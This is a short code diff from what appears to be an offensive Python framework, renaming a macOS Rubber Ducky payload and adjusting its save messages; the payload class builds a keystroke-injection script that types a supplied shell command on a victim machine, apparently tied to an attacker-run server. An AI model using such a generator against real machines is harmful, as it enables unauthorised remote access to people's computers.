@@ -23,8 +23,8 @@ import os, time
 
 class payload:
 	def __init__(self):
-		self.name = "Rubber Duck payload"
-		self.description = "Arduino payload that replicates keystrokes for shell script execution."
+		self.name = "Duck macOS payload"
+		self.description = "Rubber Ducky payload that replicates keystrokes for shell script execution."
 		self.usage = "Install via ducktoolkit.com site."
 
 	def run(self,server):
@@ -57,7 +57,8 @@ STRING """+shell_command+"""
 DELAY 500
 ENTER
 DELAY 500"""
+		h.info_general("Saving to " + payload_save_path + "...")
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_success("Payload saved to " + payload_save_path + "!")
+		h.info_success("Saved to " + payload_save_path + "!")
